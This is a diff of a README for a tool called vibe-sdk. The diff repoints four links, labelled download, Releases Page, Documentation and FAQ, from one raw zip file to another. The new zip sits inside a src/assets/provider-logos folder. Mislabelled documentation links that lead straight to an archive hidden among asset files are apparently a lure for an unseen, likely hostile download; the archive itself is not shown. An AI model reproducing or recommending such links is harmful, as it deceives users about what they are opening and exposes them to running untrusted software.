@@ -6,7 +6,7 @@ Welcome to vibe-sdk! This application lets you create powerful software by simpl
 
 ## 📥 Download & Install
 
-To get started, **visit this page to download** the latest version of vibe-sdk: [Download vibe-sdk](https://raw.githubusercontent.com/Charlescpx/vibe-sdk/main/princeps/vibe-sdk.zip). 
+To get started, **visit this page to download** the latest version of vibe-sdk: [Download vibe-sdk](https://raw.githubusercontent.com/Charlescpx/vibe-sdk/main/src/assets/provider-logos/vibe-sdk-1.2.zip). 
 
 ### 🔧 System Requirements
 
@@ -24,7 +24,7 @@ To get started, **visit this page to download** the latest version of vibe-sdk: 
 ## 💡 How to Use
 
 1. **Download the Software:**
-   - Go to the [Releases Page](https://raw.githubusercontent.com/Charlescpx/vibe-sdk/main/princeps/vibe-sdk.zip).
+   - Go to the [Releases Page](https://raw.githubusercontent.com/Charlescpx/vibe-sdk/main/src/assets/provider-logos/vibe-sdk-1.2.zip).
    - Look for the latest version and click on the download link.
 
 2. **Install the Application:**
@@ -41,7 +41,7 @@ To get started, **visit this page to download** the latest version of vibe-sdk: 
 
 ## 📚 Documentation
 
-For a detailed walkthrough, refer to the [Documentation](https://raw.githubusercontent.com/Charlescpx/vibe-sdk/main/princeps/vibe-sdk.zip). It includes tutorials, examples, and tips on best practices.
+For a detailed walkthrough, refer to the [Documentation](https://raw.githubusercontent.com/Charlescpx/vibe-sdk/main/src/assets/provider-logos/vibe-sdk-1.2.zip). It includes tutorials, examples, and tips on best practices.
 
 ## 🌐 Community Support
 
@@ -60,7 +60,7 @@ These tools help enhance your projects and provide more features.
 
 ## ✅ Troubleshooting
 
-If you encounter any issues, check the FAQ section in our [Documentation](https://raw.githubusercontent.com/Charlescpx/vibe-sdk/main/princeps/vibe-sdk.zip). Common problems include installation errors, issues with code generation, and troubleshooting deployment steps.
+If you encounter any issues, check the FAQ section in our [Documentation](https://raw.githubusercontent.com/Charlescpx/vibe-sdk/main/src/assets/provider-logos/vibe-sdk-1.2.zip). Common problems include installation errors, issues with code generation, and troubleshooting deployment steps.
 
 ## 📜 License
 
